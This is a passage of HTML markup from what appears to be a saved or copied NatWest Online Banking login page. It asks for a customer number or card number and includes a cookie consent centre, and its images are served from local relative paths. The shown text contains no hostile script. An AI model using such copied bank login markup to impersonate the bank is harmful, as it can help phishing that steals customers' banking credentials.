                                                id="ctl00_mainContent_LI5BID"
                                                class="LI5SecurityPod topHeaderLeftWrapper hideForMobile"
                                                src="./files/img/nw-security-banner-vishing-194x443.gif"
                                                alt="Take 5 to stop fraud - your bank will never call you and ask you to move your money or provide card reader codes."
                                                style="border-width: 0px;"
                                            />
                                        </a>
                                    </div>
                                    <div id="LI5DVB" class="li5MainContent">
                                        <div id="ctl00_mainContent_LI5PageFrame" class="FSCS LI5FSCS LI_FSCS">
                                            <a href="https://www.natwest.com/FSCSbrochure" id="LI5_FSCS_FSCSLogoAnchor" title="Financial Services Compensation Scheme" target="_blank">
                                                <img id="ctl00_mainContent_LI5BIFS" class="FSCSLOGO" src="./files/img/FSCS_Protected_Logo.png" alt="Financial Services Compensation Scheme. Opens in a new window." style="border-width: 0px;" />
                                            </a>
                                        </div>
                                        <div id="ctl00_mainContent_LI5PFAT" class="frame"></div>
                                        <div id="ctl00_mainContent_LI5PFAB" class="LI5PageTitle">
                                            <h1 id="ctl00_mainContent_LI5BTHA" class="" tabindex="0">
                                                Online Banking services
                                            </h1>
                                        </div>

                                        <div id="ctl00_mainContent_LI5PFB" class="tabcontainer newRadioButton newRadioButtonLogin">
                                            <ul id="ctl00_mainContent_LI5TLA" class="tabUI">
                                                <li id="ctl00_mainContent_LI5TABA" class="active"><span class="left"></span></li>
                                                <li id="ctl00_mainContent_LI5TABB"><span></span></li>
                                            </ul>
                                            <div id="ctl00_mainContent_LI5TABA_LI5PFC" class="box_li5border clearfix">
                                                <div class="box_top_li5border clearfix"><hr /></div>
                                                <div id="ctl00_mainContent_LI5TABA_PageFrame1" class="frame">
                                                    <!--<div id="ctl00_mainContent_LI5TABA_PageFrame2" class="box_frame"><div class="box_top_frame"><hr /></div>-->
                                                    <div id="ctl00_mainContent_LI5TABA_PageFrame3" class="frame">
                                                        <h2 id="ctl00_mainContent_LI5TABA_LI5BTHB" class="headingBorderBackShaded removeMarginTop" tabindex="0">
                                                            Log in - step 1
                                                        </h2>
                                                        <div id="ctl00_mainContent_LI5TABA_Div1" class="headingChevron headingChevronBorderShaded"></div>
                                                        <div class="box_borderFrameBackShaded framePadding break-before removeMarginBottom">
                                                            <div id="ctl00_mainContent_LI5TABA_PFLoginWithCardPAN" class="frame">
                                                                <div class="dbidlengthcardpan">
                                                                    <span style="display: inline-block; margin-bottom: 24px;">
                                                                        <span id="ctl00_mainContent_LI5TABA_LI5BTEK">Choose how you'd like to log in. You can use your customer number or your card number.</span>
                                                                    </span>
                                                                </div>
                                                                <div>
                                                                    <div id="ctl00_mainContent_LI5TABA_rbcustomernumberdiv" style="font-weight: normal;">
                                                                        <input type="radio" id="rbcustomernumber" name="loginoption" value="rbcustomernumber" />
                                                                        <span id="ctl00_mainContent_LI5TABA_CustomerNumberLI5DDALA" margin-left="5px" font-size="16px">Customer number</span>
                                                                    </div>
                                                                    <div id="ctl00_mainContent_LI5TABA_customernumberdiv" class="LI5Padding">
                                                                        <p class="removeMarginParagraphLi5">
                                                                            <span id="ctl00_mainContent_LI5TABA_CustomerNumberLI5BTEA" class="defaultAccount label">
                                                                                This is your date of birth (DDMMYY) followed by your unique identification number.
                                                                            </span>
                                                                        </p>
                                                                        <label id="ctl00_mainContent_LI5TABA_rbCustomerNumberLabel" for="CustomerNumber" class="visuallyhidden">Customer number</label>
                                                                        <span>
                                                                            <span id="ctl00_mainContent_LI5TABA_LI5BTEACV_customValidator" class="errorIndicator" style="color: Red; display: none;"></span> &nbsp;
                                                                            <span id="ctl00_mainContent_LI5TABA_CustomerNumber" class="dbidlengthcardpan">
                                                                                <span id="ctl00_mainContent_LI5TABA_CustomerNumber_dbidvalidator" class="errorIndicator" style="color: Red; display: none;">
                                                                                    <img
                                                                                        title="Your customer number is made up of your
date of birth (ddmmyy) and up to 4 other
numbers which are unique to you."
                                                                                        class="errorMarkerWrapper"
                                                                                        src="./files/img/error-marker.png"
                                                                                        alt=""
                                                                                        style="border-width: 0px;"
                                                                                    />
                                                                                </span>

                                                                                <span id="ctl00_mainContent_LI5TABA_CustomerNumber_RegularExpressionValidator" style="color: Red; display: none;">
                                                                                    <img
                                                                                        title="Your customer number is made up of your
date of birth (ddmmyy) and up to 4 other
numbers which are unique to you."
                                                                                        class="errorMarkerWrapper"
                                                                                        src="./files/img/error-marker.png"
                                                                                        alt="Your customer number is made up of your date of birth (ddmmyy) and up to 4 other numbers which are unique to you."
                                                                                        style="border-width: 0px;"
                                                                                    />
                                                                                </span>

                                                                                <input
																					required
                                                                                    name="ctl00$mainContent$LI5TABA$CustomerNumber_edit"
                                                                                    type="text"
                                                                                    maxlength="10"
                                                                                    id="ctl00_mainContent_LI5TABA_CustomerNumber_edit"
                                                                                    tabindex="1"
                                                                                    autocomplete="off"
                                                                                />
                                                                            </span>
                                                                        </span>
                                                                        <p></p>
                                                                        <a
                                                                            id="ctl00_mainContent_LI5TABA_CardPANLI5NLBAnchor"
                                                                            title="Forgotten your customer number? : Opens
in a new window"
                                                                            class="popUpIcon popUpIconBlock OLElinkWIDisplay popUpIconLogin forgottenCustomerNumberLink"
                                                                            onclick="window.open(&#39;https://www.nwolb.com/help.aspx?id=CN1&#39;,&#39;PinPassHelpWindow&#39;,&#39;height=600,width=800,status=yes,toolbar=no,menubar=no,location=no,scrollbars=yes,resizable=yes&#39;);return false;"
                                                                            href="https://www.nwolb.com/help.aspx?id=CN1"
                                                                            target="PinPassHelpWindow"
                                                                        >
                                                                            Forgotten your customer number?
                                                                        </a>
                                                                    </div>
                                                                    </div>
                                                                    <div id="ctl00_mainContent_LI5TABA_cardpandiv" class="LI5Padding hideForMobile" style="display: none;">
                                                                        <p class="removeMarginParagraphLi5">
                                                                            <span id="ctl00_mainContent_LI5TABA_LI5BTEM" class="hideForMobile defaultAccount label">
                                                                                The 16 digit card number across the front of your debit or credit card.<br />
                                                                            </span>
                                                                        </p>
                                                                        <label id="ctl00_mainContent_LI5TABA_rbCardNumberLabel" for="CardPAN" class="visuallyhidden">Card number</label>
                                                                        <span>
                                                                            <span id="ctl00_mainContent_LI5TABA_LI5CPCVF_customValidator" class="errorIndicator" style="color: Red; display: none;"></span>
                                                                            <span id="ctl00_mainContent_LI5TABA_CardPAN" class="cardpanlength">
                                                                                <span id="ctl00_mainContent_LI5TABA_CardPAN_RegularExpressionValidator" style="color: Red; display: none;">
                                                                                    <img
                                                                                        title="Your card number isn&#39;t recognised.
Please check and try again."
                                                                                        class="errorMarkerWrapper"
                                                                                        src="./files/img/error-marker.png"
                                                                                        alt="Your card number isn&#39;t recognised. Please check and try again."
                                                                                        style="border-width: 0px;"
                                                                                    />
                                                                                </span>
                                                                                <input name="ctl00$mainContent$LI5TABA$CardPAN_edit" type="text" maxlength="16" id="ctl00_mainContent_LI5TABA_CardPAN_edit" tabindex="1" autocomplete="off" />
                                                                                <span id="ctl00_mainContent_LI5TABA_CardPAN_edit_CheckedValidator" class="errorIndicator" style="color: Red; display: none;">
                                                                                    <img
                                                                                        title="Your card number isn&#39;t recognised.
Please check and try again."
                                                                                        class="errorMarkerWrapper"
                                                                                        src="./files/img/error-marker.png"
                                                                                        alt=""
                                                                                        style="border-width: 0px;"
                                                                                    />
                                                                                </span>
                                                                            </span>
                                                                        </span>
                                                                        <p></p>
                                                                        <rbsg:pageframe>
                                                                            <span id="ctl00_mainContent_LI5TABA_LI5BTEN" class="helpTextLabel downChevronCardNumber upChevronCardNumber">Why use my card number?</span>
                                                                        </rbsg:pageframe>
                                                                        <p class="removeMarginParagraphLi5">
                                                                            <span id="ctl00_mainContent_LI5TABA_LI5BTEP" class="hideForMobile LineHeightText" style="display: none;">
                                                                                If you've forgotten your customer number, you can enter your debit or credit card number instead - it's just as secure. Please note that we'll never ask you for your full card details to log in.
                                                                            </span>
                                                                        </p>
                                                                    </div>
                                                                </div>
                                                            </div>

                                                            <p id="ctl00_mainContent_LI5TABA_Paragraph1"></p>

                                                            <div class="li5marginTopCheckbox">
                                                                <div class="LoginCheckBox">
                                                                    <div id="ctl00_mainContent_LI5TABA_PFRememberMeCardPAN" class="LoginCheckBoxCardPAN LI5Padding">
                                                                        <span class="check_box" margin-left="10px;">
                                                                            <input id="ctl00_mainContent_LI5TABA_LI5CBBCPAN" type="checkbox" name="ctl00$mainContent$LI5TABA$LI5CBBCPAN" />
                                                                            <label for="ctl00_mainContent_LI5TABA_LI5CBBCPAN">Remember me.</label>
                                                                        </span>
                                                                        <span id="ctl00_mainContent_LI5TABA_LI5BTES" class="helpTextLabel downChevronRememberMe noMargin upChevronRememberMe" tabindex="0" role="link">
                                                                            What does this mean?
                                                                        </span>
                                                                        <p id="ctl00_mainContent_LI5TABA_Paragraph2" class="removeMarginParagraphLi5">
                                                                            <span id="ctl00_mainContent_LI5TABA_LI5BTET" tabindex="0" style="display: none;">
                                                                                By enabling the functional cookie and choosing 'Remember me’, your customer number will be saved to your computer or device for future visits. If you use your
                                                                                card number we won’t save this, but we’ll use it to identify your customer number so we can still remember you. We don’t recommend using this if you’re using a
                                                                                public or shared computer.
                                                                            </span>
                                                                        </p>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>

                                                    <div class="LoginCheckBox"></div>

                                                    <div id="ctl00_mainContent_LI5TABA_PFLoginButtonCP" class="frame"></div>
                                                </div>
                                                <!--</div>-->
                                            </div>
                                        </div>
                                        <div id="ctl00_mainContent_LI5TABA_LI5PFF" class="ButtonFullWidth borderTopMargin">
                                            <div class="btnbg" id="ctl00_mainContent_LI5TABA_LI5-LBB_button_wrapper">
                                                <input
                                                    type="submit"
                                                    name="ctl00$mainContent$LI5TABA$LI5-LBB_button_button"
                                                    value="Continue"
                                                    id="ctl00_mainContent_LI5TABA_LI5-LBB_button_button"
                                                    class="button-right button-img"
                                                />
                                            </div>
                                            <div id="ctl00_mainContent_LI5TABA_PageFrame4" class="frame">
                                                <br />
                                                <div id="ctl00_mainContent_LI5TABA_PFNavLinkCardPAN" class="SignUpHereAlignMobile LinkAlignWithButton">
                                                    <span id="ctl00_mainContent_LI5TABA_LI5NLE2" class="noArrowLink">Not an online user? </span>
                                                    <a
                                                        id="ctl00_mainContent_LI5TABA_LI5PULCAnchor"
                                                        title="Sign up here : Opens in a new window"
                                                        class="popUpIcon OLElinkWIDisplay"
                                                        target="_blank"
                                                        href="https://www.nwolb.com/Default.aspx?InnerPage=OLE"
                                                    >
                                                        Sign up here
                                                    </a>
                                                </div>
                                                <br />
                                            </div>
                                        </div>

                                        <div id="ctl00_mainContent_LI5PFH" class="loginLegal break-before">
                                            <p>
                                                <span id="ctl00_mainContent_LI5BTEB">
                                                    Only individuals who have a NatWest account and authorised access to Online Banking should proceed beyond this point. For the security of customers, any unauthorised attempt to access
                                                    customer bank information will be monitored and may be subject to legal action.
                                                </span>
                                            </p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </form>
                    </div>

                    <span id="ctl00_mainContent_ctl105" class="errorIndicator" style="color: Red; display: none;"></span>

                    <span
                        pagename="Login"
                        pagesection="LI8ACEA|Enter your activation code|,FSCSLogo|FSCS Logo|FSCS|,CustomerNumber|Customer Number|,CardPAN|Pan Number|,rbcustomernumber|customernumber radiobtn|Customer Number,rbcardnumber|pannumber radiobtn|PAN Number,LI5BTES|Remeberme-explanation|,LI5TABB||,LI5BIBAltText|Credit card page|,LI5-LBB|continue button|Login,LI5CBBCPAN|Rememberme checkbox|,LI5PULC|Sign Up,LI5NLFA|Sign Up|,HDRPULD|Show me how|,HDRNLA|LOG IN|Header Login|,LI8IMBA|Login - Re-register for Online Banking|,LI8IMBB|Login - Send by Post"
                        pagewizard="LI5|LoginStep1,LI6|LoginStep2,LI6APNL|LoginStep2,LI6A|LoginStep2,LI8|Login - Activate Online Banking"
                        isenable="On"
                        id="Datafieldtagg"
                        defaultselectedvalue="rbcustomernumber"
                        errorfemcode="LI8ACEA|validation_ACEM01-validation_ACEM02,"
                    ></span>

                    
                    

                    
                    
                    
                </div>

                <a name="menu"></a>
            </div>

            <br class="clear" />
        </div>
        
        
        <div id="footer" class="footerContainer clearfix">
            <ul class="footer_navbar">
                <li>
                    <a
                        id="ctl00_footer_ctl00_PopUpLink2Anchor"
                        title="Legal Info : Opens in a new window"
                        onclick="window.open(&#39;https://www.nwolb.com/TermsAndConditions.aspx&#39;,&#39;headerWindow&#39;,&#39;top=70,left=60,width=800,height=600,resizable=yes,scrollbars=yes,location=yes&#39;);return false;"
                        href="https://www.nwolb.com/TermsAndConditions.aspx"
                        target="headerWindow"
                    >
                        Legal Info
                    </a>
                </li>
                <li class="footerSeparator"><span id="ctl00_footer_ctl00_FooterSeparator1">·</span></li>
                <li>
                    <a
                        id="ctl00_footer_ctl00_PopUpLink4Anchor"
                        title="Security : Opens in a new window"
                        onclick="window.open(&#39;https://www.natwest.com/tools/general/nwolb_legals/security.htm&#39;,&#39;headerWindow&#39;,&#39;top=70,left=60,width=800,height=600,resizable=yes,scrollbars=yes,location=yes&#39;);return false;"
                        href="https://www.natwest.com/tools/general/nwolb_legals/security.htm"
                        target="headerWindow"
                    >
                        Security
                    </a>
                </li>
                <li class="footerSeparator"><span id="ctl00_footer_ctl00_FooterSeparator2">·</span></li>
                <li>
                    <a
                        id="ctl00_footer_ctl00_PopUpLink1Anchor"
                        title="Privacy &amp; Cookies : Opens in a new
window"
                        onclick="window.open(&#39;https://www.nwolb.com/cookiesPolicy.aspx&#39;,&#39;headerWindow&#39;,&#39;top=70,left=60,width=800,height=600,resizable=yes,scrollbars=yes,location=yes&#39;);return false;"
                        href="https://www.nwolb.com/cookiesPolicy.aspx"
                        target="headerWindow"
                    >
                        Privacy &amp; Cookies
                    </a>
                </li>

                <li class="FSCSLI">
                    <div id="ctl00_footer_ctl00_FSCSMobilePageFrame" class="FSCSmobile">
                        <a href="https://www.natwest.com/FSCSbrochure" id="LI_FSCS_FSCSLogoAnchor" title="Financial Services Compensation Scheme" target="_new">
                            <img id="ctl00_footer_ctl00_LI5BIFS" class="FSCSLOGO" opennewtab="true" src="./files/img/FSCS_Protected_Logo.png" alt="Financial Services Compensation Scheme. Opens in a new window." style="border-width: 0px;" />
                        </a>
                    </div>
                </li>
                <li class="footerSeparator hideForMobile"><span id="ctl00_footer_ctl00_FooterSeparator3">·</span></li>
                <li>
                    <a
                        id="ctl00_footer_ctl00_PopUpLink3Anchor"
                        title="Accessibility : Opens in a new window"
                        onclick="window.open(&#39;https://www.natwest.com/tools/general/nwolb_legals/accessibility.htm&#39;,&#39;headerWindow&#39;,&#39;top=70,left=60,width=800,height=600,resizable=yes,scrollbars=yes,location=yes&#39;);return false;"
                        href="https://www.natwest.com/tools/general/nwolb_legals/accessibility.htm"
                        target="headerWindow"
                    >
                        Accessibility
                    </a>
                </li>

                <li class="footerSeparator hideForMobile"><span id="ctl00_footer_ctl00_FooterSeparator4">·</span></li>
                <li class="last FSCSLast"><span id="ctl00_footer_ctl00_CopyrightText">© 2005-2020 National Westminster Bank plc</span></li>
            </ul>
        </div>

        

        <div id="rsaFlashMovie"></div>
        

        <div id="onetrust-consent-sdk">
            <div class="onetrust-pc-dark-filter ot-fade-in" style="visibility: hidden; opacity: 0; transition: visibility 0s ease 400ms, opacity 400ms linear 0s; display: none;"></div>
            <div
                id="onetrust-pc-sdk"
                class="ot-sdk-container otPcCenter ot-fade-in ot-accordions-pc"
                aria-modal="true"
                role="dialog"
                aria-labelledby="pc-title"
                lang="en"
                style="visibility: hidden; opacity: 0; transition: visibility 0s ease 400ms, opacity 400ms linear 0s; display: none;"
                tabindex="0"
            >
                <!-- Close Button -->
                <!-- Close Button -->
                <div id="content" class="ot-main-content" style="display: block;">
                    <!-- Logo Tag -->
                    <div class="pc-logo-container">
                        <div
                            class="pc-logo"
                            role="img"
                            aria-label="Company Logo"
                            style="background-image: url('https://cdn.cookielaw.org/logos/dbc21066-cf90-4835-8da3-7f0d4fc99ed8/8d28dc59-5712-4d5e-87bf-7eeeae8c841e/natwest-logo.png');"
                        ></div>
                    </div>
                    <h3 id="pc-title">Privacy Preference Centre</h3>
                    <div id="pc-policy-text">
                        When you visit any website, it may store or retrieve information on your browser, mostly in the form of cookies. This information might be about you, your preferences or your device and is mostly used to make the
                        site work as you expect it to. The information does not usually directly identify you, but it can give you a more personalized web experience. Because we respect your right to privacy, you can choose not to allow
                        some types of cookies. Click on the different category headings to find out more and change our default settings. However, blocking some types of cookies may impact your experience of the site and the services we are
                        able to offer. <a href="https://www.nwolb.com/cookiesPolicy.aspx" class="privacy-notice-link" target="_blank" aria-label="More information, Opens in a new window" tabindex="0">More information</a>
                    </div>
                    <div id="accept-recommended-container" class="ot-sdk-row">
                        <div class="ot-sdk-column"><button id="accept-recommended-btn-handler" class="button-theme" tabindex="0" style="display: inline-block;">Allow All Cookies</button></div>
                    </div>
                    <section id="cookie-preferences" class="ot-sdk-row category-group">
                        <h3 id="manage-cookies-text">Manage Consent Preferences</h3>
                        <div class="accordion-text category-item ot-always-active-group" data-optanongroupid="C0001">
                            <!-- Group name -->
                            <h4 class="category-header" id="ot-header-id-C0001">Strictly Necessary Cookies</h4>
                            <div class="ot-always-active">Always Active</div>
                            <!-- Group toggle -->
                            <div class="ot-switch toggle ot-hide-tgl">
                                <input
                                    type="checkbox"
                                    name="ot-group-id-C0001"
                                    class="switch-checkbox category-switch-handler"
                                    id="ot-group-id-C0001"
                                    aria-checked="true"
                                    role="switch"
                                    aria-controls="ot-desc-id-C0001"
                                    aria-labelledby="ot-header-id-C0001"
                                    aria-hidden="true"
                                    data-optanongroupid="C0001"
                                    checked=""
                                    tabindex="0"
                                />
                                <label class="ot-switch-label" for="ot-group-id-C0001"><span class="ot-switch-inner"></span> <span class="ot-switch-nob"></span> <span class="label-text">Strictly Necessary Cookies</span></label>
                            </div>
                            <!-- Group description -->
                            <p class="ot-category-desc" id="ot-desc-id-C0001" aria-labelledby="ot-group-id-C0001">
                                These cookies are necessary for the website to function and cannot be switched off in our systems. They are usually only set in response to actions made by you which amount to a request for services, such as
                                setting your privacy preferences, logging in or filling in forms. You can set your browser to block or alert you about these cookies, but some parts of the site will not then work. These cookies do not store
                                any personally identifiable information.
                            </p>
                            <!-- sub groups --><!-- view vendors link --><!-- View host link -->
                            <div class="category-host-list-container"><a class="category-host-list-btn category-host-list-handler" role="button" href="javascript:void(0)" data-parent-id="C0001" tabindex="0">Cookies Details‎</a></div>
                        </div>
                        <div class="accordion-text category-item" data-optanongroupid="C0009">
                            <!-- Group name -->
                            <h4 class="category-header" id="ot-header-id-C0009">Customer Experience</h4>
                            <!-- Group toggle -->
                            <div class="ot-switch toggle">
                                <input
                                    type="checkbox"
                                    name="ot-group-id-C0009"
                                    class="switch-checkbox category-switch-handler"
                                    id="ot-group-id-C0009"
                                    aria-checked="false"
                                    role="switch"
                                    aria-controls="ot-desc-id-C0009"
                                    aria-labelledby="ot-header-id-C0009"
                                    data-optanongroupid="C0009"
                                    tabindex="0"
                                />
                                <label class="ot-switch-label" for="ot-group-id-C0009"><span class="ot-switch-inner"></span> <span class="ot-switch-nob"></span> <span class="label-text">Customer Experience</span></label>
                            </div>
                            <!-- Group description -->
                            <p class="ot-category-desc" id="ot-desc-id-C0009" aria-labelledby="ot-group-id-C0009">
                                These cookies are used to generate reports based on data from visits to the website, without knowing who the visitor is. These cookies help us to gain insight of the pages that have been visited to help
                                inform the optimisation of website layouts and to improve visitor journeys. Using cookies to track the most visited areas of our website and to identify when users encounter errors on the website, will help
                                us ensure that our website is optimised to remove confusing or ineffective content. You can switch these cookies off at any time by visiting your Cookies Preference Centre.
                            </p>
                            <!-- sub groups --><!-- view vendors link --><!-- View host link -->
                            <div class="category-host-list-container"><a class="category-host-list-btn category-host-list-handler" role="button" href="javascript:void(0)" data-parent-id="C0009" tabindex="0">Cookies Details‎</a></div>
                        </div>
                        <div class="accordion-text category-item" data-optanongroupid="C0003">
                            <!-- Group name -->
                            <h4 class="category-header" id="ot-header-id-C0003">Functional Cookies</h4>
                            <!-- Group toggle -->
                            <div class="ot-switch toggle">
                                <input
                                    type="checkbox"
                                    name="ot-group-id-C0003"
                                    class="switch-checkbox category-switch-handler"
                                    id="ot-group-id-C0003"
                                    aria-checked="false"
                                    role="switch"
                                    aria-controls="ot-desc-id-C0003"
                                    aria-labelledby="ot-header-id-C0003"
                                    data-optanongroupid="C0003"
                                    tabindex="0"
                                />
                                <label class="ot-switch-label" for="ot-group-id-C0003"><span class="ot-switch-inner"></span> <span class="ot-switch-nob"></span> <span class="label-text">Functional Cookies</span></label>
                            </div>
                            <!-- Group description -->
                            <p class="ot-category-desc" id="ot-desc-id-C0003" aria-labelledby="ot-group-id-C0003">
                                These cookies enable the website to provide enhanced functionality and personalisation. They may be set by us or by third party providers whose services we have added to our pages. If you do not allow these
                                cookies then some or all of these services may not function properly.
                            </p>
                            <!-- sub groups --><!-- view vendors link --><!-- View host link -->
                            <div class="category-host-list-container"><a class="category-host-list-btn category-host-list-handler" role="button" href="javascript:void(0)" data-parent-id="C0003" tabindex="0">Cookies Details‎</a></div>
                        </div>
                        <div class="accordion-text category-item" data-optanongroupid="C0002">
                            <!-- Group name -->
                            <h4 class="category-header" id="ot-header-id-C0002">Performance Cookies</h4>
                            <!-- Group toggle -->
                            <div class="ot-switch toggle">
                                <input
                                    type="checkbox"
                                    name="ot-group-id-C0002"
                                    class="switch-checkbox category-switch-handler"
                                    id="ot-group-id-C0002"
                                    aria-checked="false"
                                    role="switch"
                                    aria-controls="ot-desc-id-C0002"
                                    aria-labelledby="ot-header-id-C0002"
                                    data-optanongroupid="C0002"
                                    tabindex="0"
                                />
                                <label class="ot-switch-label" for="ot-group-id-C0002"><span class="ot-switch-inner"></span> <span class="ot-switch-nob"></span> <span class="label-text">Performance Cookies</span></label>
                            </div>
                            <!-- Group description -->
                            <p class="ot-category-desc" id="ot-desc-id-C0002" aria-labelledby="ot-group-id-C0002">
                                These cookies allow us to count visits and traffic sources so we can measure and improve the performance of our site. They help us to know which pages are the most and least popular and see how visitors move
                                around the site. All information these cookies collect is aggregated and therefore anonymous. If you do not allow these cookies we will not know when you have visited our site, and will not be able to monitor
                                its performance.
                            </p>
                            <!-- sub groups --><!-- view vendors link --><!-- View host link -->
                            <div class="category-host-list-container"><a class="category-host-list-btn category-host-list-handler" role="button" href="javascript:void(0)" data-parent-id="C0002" tabindex="0">Cookies Details‎</a></div>
                        </div>
                        <div class="accordion-text category-item" data-optanongroupid="C0004">
                            <!-- Group name -->
                            <h4 class="category-header" id="ot-header-id-C0004">Targeting Cookies</h4>
                            <!-- Group toggle -->
                            <div class="ot-switch toggle">
                                <input
                                    type="checkbox"
                                    name="ot-group-id-C0004"
                                    class="switch-checkbox category-switch-handler"
                                    id="ot-group-id-C0004"
                                    aria-checked="false"
                                    role="switch"
                                    aria-controls="ot-desc-id-C0004"
                                    aria-labelledby="ot-header-id-C0004"
                                    data-optanongroupid="C0004"
                                    tabindex="0"
                                />
                                <label class="ot-switch-label" for="ot-group-id-C0004"><span class="ot-switch-inner"></span> <span class="ot-switch-nob"></span> <span class="label-text">Targeting Cookies</span></label>
                            </div>
                            <!-- Group description -->
                            <p class="ot-category-desc" id="ot-desc-id-C0004" aria-labelledby="ot-group-id-C0004">
                                These cookies may be set through our site by our advertising partners. They may be used by those companies to build a profile of your interests and show you relevant adverts on other sites. They do not store
                                directly personal information, but are based on uniquely identifying your browser and internet device. If you do not allow these cookies, you will experience less targeted advertising.
                            </p>
                            <!-- sub groups --><!-- view vendors link --><!-- View host link -->
                            <div class="category-host-list-container"><a class="category-host-list-btn category-host-list-handler" role="button" href="javascript:void(0)" data-parent-id="C0004" tabindex="0">Cookies Details‎</a></div>
                        </div>
                        <!-- Groups sections starts --><!-- Group section ends --><!-- Accordion Group section starts --><!-- Accordion Group section ends --><!-- Footer section starts -->
                        <div class="save-preference-btn-container">
                            <button class="save-preference-btn-handler onetrust-close-btn-handler button-theme" tabindex="0">Confirm My Choices</button>
                            <div class="ot-pc-footer-logo"><a class="powered-by-logo" href="https://onetrust.com/poweredbyonetrust" target="_blank" rel="noopener" aria-label="Powered by Onetrust" tabindex="0"></a></div>
                        </div>
                        <!-- Footer section ends -->
                    </section>
                </div>
                <section id="vendors-list" class="hide hosts-list">
                    <div id="vendors-list-header">
                        <a class="back-btn-handler" role="button" href="javascript:void(0)" aria-label="Back" tabindex="0">
                            <svg id="back-arrow" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 444.531 444.531" xml:space="preserve">
                                <title>Back Button</title>
                                <g>
                                    <path
                                        fill="#656565"
                                        d="M213.13,222.409L351.88,83.653c7.05-7.043,10.567-15.657,10.567-25.841c0-10.183-3.518-18.793-10.567-25.835
                      l-21.409-21.416C323.432,3.521,314.817,0,304.637,0s-18.791,3.521-25.841,10.561L92.649,196.425
                      c-7.044,7.043-10.566,15.656-10.566,25.841s3.521,18.791,10.566,25.837l186.146,185.864c7.05,7.043,15.66,10.564,25.841,10.564
                      s18.795-3.521,25.834-10.564l21.409-21.412c7.05-7.039,10.567-15.604,10.567-25.697c0-10.085-3.518-18.746-10.567-25.978
                      L213.13,222.409z"
                                    ></path>
                                </g>
                            </svg>
                            <p class="pc-back-button-text">Back</p>
                        </a>
                        <!-- Close Button -->
                        <!-- Close Button -->
                        <h3 id="vendors-list-title">Performance Cookies</h3>
                        <div id="search-container">
                            <label for="vendor-search-handler" class="screen-reader-only">Vendor Search</label> <input id="vendor-search-handler" type="text" placeholder="Search..." name="vendor-search-handler" tabindex="0" />
                            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="30" height="30" viewBox="0 -30 110 110">
                                <title>Search Icon</title>
                                <path
                                    fill="#2e3644"
                                    d="M55.146,51.887L41.588,37.786c3.486-4.144,5.396-9.358,5.396-14.786c0-12.682-10.318-23-23-23s-23,10.318-23,23
                  s10.318,23,23,23c4.761,0,9.298-1.436,13.177-4.162l13.661,14.208c0.571,0.593,1.339,0.92,2.162,0.92
                  c0.779,0,1.518-0.297,2.079-0.837C56.255,54.982,56.293,53.08,55.146,51.887z M23.984,6c9.374,0,17,7.626,17,17s-7.626,17-17,17
                  s-17-7.626-17-17S14.61,6,23.984,6z"
                                ></path>
                            </svg>
                            <a href="javascript:void(0)" id="filter-btn-handler" role="button" aria-label="Filter Icon" tabindex="0">
                                <svg
                                    role="presentation"
                                    aria-hidden="true"
                                    id="filter-icon"
                                    xmlns="http://www.w3.org/2000/svg"
                                    xmlns:xlink="http://www.w3.org/1999/xlink"
                                    x="0px"
                                    y="0px"
                                    width="15px"
                                    height="15px"
                                    viewBox="0 0 402.577 402.577"
                                    style="enable-background: new 0 0 402.577 402.577;"
                                    xml:space="preserve"
                                >
                                    <title>Filter Icon</title>
                                    <g>
                                        <path
                                            id="filter-icon-path"
                                            fill="#656565"
                                            d="M400.858,11.427c-3.241-7.421-8.85-11.132-16.854-11.136H18.564c-7.993,0-13.61,3.715-16.846,11.136
                c-3.234,7.801-1.903,14.467,3.999,19.985l140.757,140.753v138.755c0,4.955,1.809,9.232,5.424,12.854l73.085,73.083
                c3.429,3.614,7.71,5.428,12.851,5.428c2.282,0,4.66-0.479,7.135-1.43c7.426-3.238,11.14-8.851,11.14-16.845V172.166L396.861,31.413
                C402.765,25.895,404.093,19.231,400.858,11.427z"
                                        ></path>
                                    </g>
                                </svg>
                            </a>
                            <div id="triangle"></div>
                            <section id="filter-modal">
                                <div id="options">
                                    <div id="clear-filters-container">
                                        <a href="javascript:void(0)" id="clear-filters-handler" role="button" tabindex="0"><p>Clear Filters</p></a>
                                    </div>
                                    <div class="group-options">
                                        <div class="group-option">
                                            <div class="ot-checkbox">
                                                <input id="storage-access-group" class="group-option-box category-filter-handler" type="checkbox" tabindex="0" />
                                                <label for="storage-access-group"><span>Information storage and access</span></label>
                                            </div>
                                        </div>
                                    </div>
                                    <button id="filter-apply-handler" class="ot-pill">Apply</button>
                                </div>
                            </section>
                        </div>
                        <div id="select-all-container">
                            <div class="ot-checkbox">
                                <div class="leg-int-sel-all-hdr"><span class="consent-hdr">Consent</span> <span class="leg-int-hdr">Leg.Interest</span></div>
                                <div id="select-all-text-container"><p>All Consent Allowed</p></div>
                                <!-- select all vendor leg.int toggle container -->
                                <div id="select-all-vendors-leg-input-container">
                                    <input id="select-all-vendor-leg-handler" class="group-option-box" type="checkbox" tabindex="0" /> <label for="select-all-vendor-leg-handler"><span class="label-text">Select All Vendors</span></label>
                                </div>
                                <!-- select all vendor consent toggle container -->
                                <div id="select-all-vendors-input-container">
                                    <input id="select-all-vendor-groups-handler" class="group-option-box" type="checkbox" tabindex="0" />
                                    <label for="select-all-vendor-groups-handler"><span class="label-text">Select All Vendors</span></label>
                                </div>
                                <!-- Hosts select all input container -->
                                <div id="select-all-hosts-input-container">
                                    <input id="select-all-hosts-groups-handler" class="group-option-box" type="checkbox" tabindex="0" />
                                    <label for="select-all-hosts-groups-handler"><span class="label-text">All Consent Allowed</span></label>
                                </div>
                            </div>
                        </div>
                    </div>
                    <section id="vendor-list-content" class="host-list-content">
                        <div id="vendors-list-text" class="ot-sdk-row">
                            <div class="ot-sdk-column">
                                <ul id="hosts-list-container">
                                    <li class="host-item">
                                        <input type="checkbox" class="host-box" role="button" aria-expanded="false" aria-label="33Across" tabindex="0" />
                                        <section class="accordion-header">
                                            <div class="host-info">
                                                <h3 class="host-title">33Across</h3>
                                                <h4 class="host-description">host description</h4>
                                                <!-- view third party cookie link with arrow -->
                                                <div class="host-notice">
                                                    <h4 class="host-view-cookies">View Cookies</h4>
                                                    <div class="ot-arrow-container"></div>
                                                </div>
                                            </div>
                                            <!-- Checkbox -->
